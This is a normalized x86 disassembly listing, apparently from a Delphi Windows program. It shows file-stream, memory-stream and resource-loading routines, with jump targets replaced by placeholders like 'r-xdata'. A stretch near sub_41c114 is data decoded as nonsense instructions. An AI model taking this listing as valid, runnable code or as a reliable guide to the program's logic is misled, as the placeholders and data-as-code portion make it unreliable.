mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40d354
pop ebx
pop ebp
retn 0x8
sub_41ba0c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41ba50
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41ba50
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41bb79
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403668
movzx edx di
mov eax esi
call sub_408890
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b948
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_40890c
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b948
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb80
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_40413c
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408af4
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b584
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408af4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b584
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
jmp r-xdata
sub_41bb80
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41bba4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
call sub_4089a4
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41bbe0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028e8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41bc18
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41bc3c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_41bc68
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41bc80
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41b514
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41b720
sub_41bcb8
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41bbd8
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41bce0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41bcb8
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41bd0c
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406e30
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406e14
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406e04
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
test ecx ecx
jne r-xdata
sub_41bd98
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028e8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41bcb8
sub_41bde8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40416c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41be2c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4043d8
mov esi eax
sub esi [ ebx + 0x8 ]
cmp edi esi
jge r-xdata
lea eax [ ebx + 0x4 ]
call j_sub_4045e4
mov edx [ ebx + 0x8 ]
add eax edx
mov edx ebp
mov ecx esi
call sub_4028e8
add [ ebx + 0x8 ] esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi edi
sub_41be6c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi ecx
mov edx [ ebx + 0x8 ]
add edx esi
lea eax [ ebx + 0x4 ]
call sub_404764
lea eax [ ebx + 0x4 ]
call j_sub_4045e4
mov edx [ ebx + 0x8 ]
lea edx [ eax + edx ]
mov eax edi
mov ecx esi
call sub_4028e8
add [ ebx + 0x8 ] esi
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41bea4
push ebx
push esi
mov esi edx
mov ebx eax
sub cx 0x1
jb r-xdata
mov [ ebx + 0x8 ] esi
jmp r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4043d8
cmp eax [ ebx + 0x8 ]
jge r-xdata
add [ ebx + 0x8 ] esi
jmp r-xdata
dec cx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jge r-xdata
mov eax [ ebx + 0x4 ]
call sub_4043d8
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
call sub_4043d8
sub eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x8 ]
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x8 ] eax
sub_41befc
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x4 ]
mov edx esi
call sub_404764
cmp esi [ ebx + 0x8 ]
jge r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] esi
sub_41bf18
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4045d8
mov ecx eax
mov edx esi
mov eax edi
call sub_41bfe0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41bf70
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41bfd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfda
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_41bfe0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41bf70
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41bbd8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41bf70
pop ecx
sub_41c04c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406e00
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41c09c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026ec
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41c0e4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_40270c
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41c114
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
rol [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x3f ] bh
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax + 0xe0041c2 ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax + 0xe0041c2 ] bl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
aam 0xc1
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
rol [ ecx ] 0x18
add [ eax ] al
add [ eax ] dl
rol [ ecx ] 0x4c
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404208
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404678
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_40416c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40416c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41c1e8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_40416c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40416c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41c240
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404208
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404678
mov al 0x1
inc ebx
sub_41c298
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41c30f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405ab8
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_415b08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c316
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_414e50
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405ab8
mov ecx eax
mov eax esi
pop edx
call sub_40d848
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405ab8
sub_41c31c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41c3c2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c3c9
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404208
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_421f84
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_408180
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41c3e4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418d54
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418d54
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418b9c
sub_41c41c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418d54
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418d54
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_418be8
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418b9c
sub_41c464
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41c5fd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_4190bc
mov edi eax
xor edx edx
push ebp
push sub_41c5de
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c5e5
mov eax [ rw-data ]
call sub_419120
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41c5bf
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41c56d
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_418cf8
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4186b8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c574
mov eax [ ebp - 0x8 ]
call sub_40331c
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4150d8
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41c3e4
pop ecx
mov edx esi
mov eax edi
call sub_418be8
mov eax ebx
call sub_40331c
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41c31c
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41c41c
pop ecx
inc esi
sub_41c574
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
sub_41c60c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4190bc
mov edi eax
xor eax eax
push ebp
push sub_41c6a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419120
retn
mov edx ebx
mov eax edi
call sub_418cf8
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_418be8
mov eax esi
call sub_40331c
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_408180
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41c6b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4190bc
mov edi eax
xor eax eax
push ebp
push sub_41c72f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419120
retn
mov edx ebx
mov eax edi
call sub_418cf8
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_418be8
mov eax esi
call sub_40331c
sub_41c760
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
pop ecx
pop edx
pop ebx
retn
sub_41c7a4
push ebx
push esi
push edi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c0e4
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41c7e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41e6b8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41e7c8
call sub_41c754
sub_41c804
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_408180
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_404118
sub_41c838
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_408180
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e6b8
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c8f9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41cc7c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41cc7c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c900
mov eax [ ebp - 0x8 ]
call sub_40331c
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41e7c8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41c754
sub_41c928
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41c948
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4043b4
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_403588
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41c754
sub_41c9b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_4190bc
mov esi eax
xor edx edx
push ebp
push sub_41ca20
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca27
mov eax [ rw-data ]
call sub_419120
retn
mov edx ebx
mov eax esi
call sub_418cf8
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_40331c
mov edx ebx
mov eax esi
call sub_418be8
sub_41ca2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41cb3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
